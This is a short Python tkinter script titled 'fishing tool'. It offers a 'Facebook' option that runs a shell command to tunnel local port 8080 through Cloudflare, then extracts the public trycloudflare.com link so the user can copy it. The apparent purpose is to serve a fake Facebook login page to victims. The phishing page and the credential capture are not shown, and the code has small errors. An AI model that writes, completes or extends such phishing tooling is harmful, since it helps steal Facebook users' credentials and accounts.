from tkinter import *
import os
from tkinter.ttk import *
def sites():
	def fish():
		def openInstrucktion():
			f = open("assets/new.txt")
			copyplace.insert(INSERT, f.read())
		link = os.system("cd assets; hostit -f cloudflare 8080 > link.txt dev/null 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' 'link.txt' > new.txt; rm link.txt")
		root3 = Tk()
		root3.title("link")
		copyplace = Entry(root3, width=60, font="Calibri 10")
		copyplace.grid(row=0,column=2)
		copybutton = Button(root3,text="copy link", command= openInstrucktion)
		copybutton.grid(row=0, column=0)
		root3.mainloop()
	root1 = Tk()
	root1.geometry('500x300')
	root1.title("coose option")
	option1 = Button(root1, text = 'Facebook',style = 'W.TButton', command = fish).grid(row = 0, column = 0)
	toolcloser = Button(root1, text = 'Quit !', style = 'W.TButton', command = root1.destroy).grid(row = 0, column = 1)
	root1.mainloop()

root = Tk()
root.geometry('300x200')
root.title("fishing tool")
sty = Style()
sty.configure('W.TButton', font = ('calibri', 10, 'bold', 'underline'), foreground = 'red')
btn1 = Button(root, text = 'Click me !', command =sites).grid(row = 0, column = 3, pady = 10, padx = 100)
btn2 = Button(root, text = 'Quit !', style = 'W.TButton', command = root.destroy).grid(row = 1, column = 3, padx = 100)
root.mainloop()
